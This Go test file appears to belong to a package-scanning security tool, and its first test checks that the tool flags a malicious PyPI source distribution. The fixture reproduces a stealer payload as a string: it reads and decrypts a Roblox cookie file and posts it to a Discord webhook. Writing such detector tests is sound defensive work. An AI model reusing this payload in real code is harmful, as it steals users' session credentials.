package source

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"encoding/json"
	"io"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/sarahmaeve/signatory/internal/profile"
	"github.com/sarahmaeve/signatory/internal/signal"
)

type stubArtifactFetcher struct {
	body []byte
	err  error
}

func (s stubArtifactFetcher) Fetch(_ context.Context, _ string) (io.ReadCloser, error) {
	if s.err != nil {
		return nil, s.err
	}
	return io.NopCloser(bytes.NewReader(s.body)), nil
}

func makeTarGz(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for name, body := range files {
		require.NoError(t, tw.WriteHeader(&tar.Header{
			Name: name, Size: int64(len(body)), Mode: 0o644, Typeflag: tar.TypeReg,
		}))
		_, err := tw.Write([]byte(body))
		require.NoError(t, err)
	}
	require.NoError(t, tw.Close())
	require.NoError(t, gz.Close())
	return buf.Bytes()
}

// TestArtifactSourceCollector_EmitsConcernForSpadataSdist exercises the
// whole no-clone path: a published sdist (stub-fetched) whose
// __init__.py is the spadata stealer must emit artifact_source_concern
// with the concern firing — no git clone involved, so this fires even
// when the source repo is clean, absent, or differs from what shipped.
func TestArtifactSourceCollector_EmitsConcernForSpadataSdist(t *testing.T) {
	t.Parallel()
	const entityID = "e-spadata"

	payload := "" +
		"import os, base64, requests\n" +
		"from win32crypt import CryptUnprotectData\n" +
		"blob = open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Roblox', 'LocalStorage', 'robloxcookies.dat'), 'rb').read()\n" +
		"cookie = CryptUnprotectData(base64.b64decode(blob))[1]\n" +
		"requests.post('https://discord.com/api/webhooks/1/x', json={'c': cookie})\n"

	tgz := makeTarGz(t, map[string]string{
		"spadata-0.1.1/setup.py":            "from setuptools import setup\nsetup(name='spadata')\n",
		"spadata-0.1.1/spadata/__init__.py": payload,
	})

	inRun := &signal.CollectionResult{}
	inRun.RecordSignal(entityID, "artifact_url", "pypi-registry",
		time.Now().UTC(), time.Hour,
		map[string]any{"url": "https://example.invalid/spadata-0.1.1.tar.gz", "version": "0.1.1"})

	c := NewArtifactSourceCollector(inRun, stubArtifactFetcher{body: tgz})
	entity := &profile.Entity{
		ID:           entityID,
		CanonicalURI: "pkg:pypi/spadata",
		Type:         profile.EntityPackage,
		Ecosystem:    "pypi",
	}

	result, err := c.Collect(context.Background(), entity)
	require.NoError(t, err)
	require.Equal(t, 1, result.SignalCount())

	var v ArtifactSourceConcernValue
	var found bool
	for _, s := range result.Signals() {
		if s.Type == "artifact_source_concern" {
			found = true
			require.NoError(t, json.Unmarshal(s.Value, &v))
		}
	}
	require.True(t, found, "must emit artifact_source_concern")
	assert.True(t, v.Concern.ConcernPresent,
		"the spadata sdist's source must independently fire concern")
	assert.Contains(t, v.Concern.ConcerningFeatures, "credential_decrypt_calls")
	assert.Contains(t, v.Concern.ConcerningFeatures, "sensitive_path_reads")
	assert.Equal(t, "0.1.1", v.Version)
}

func TestArtifactSourceCollector_AbsenceWhenNoArtifactURL(t *testing.T) {
	t.Parallel()
	c := NewArtifactSourceCollector(&signal.CollectionResult{}, stubArtifactFetcher{})
	entity := &profile.Entity{ID: "e", Ecosystem: "pypi", Type: profile.EntityPackage}
	result, err := c.Collect(context.Background(), entity)
	require.NoError(t, err)
	assert.Equal(t, 0, result.SignalCount())
	assert.Equal(t, 1, result.AbsenceCount(), "no artifact_url → one absence on artifact_source_concern")
}

func TestArtifactSourceCollector_UnsupportedEcosystemSkips(t *testing.T) {
	t.Parallel()
	c := NewArtifactSourceCollector(&signal.CollectionResult{}, stubArtifactFetcher{})
	entity := &profile.Entity{ID: "e", Ecosystem: "maven", Type: profile.EntityPackage}
	result, err := c.Collect(context.Background(), entity)
	require.NoError(t, err)
	assert.Equal(t, 0, result.SignalCount())
	assert.Equal(t, 0, result.AbsenceCount(), "unsupported ecosystem skips silently, no absence")
}
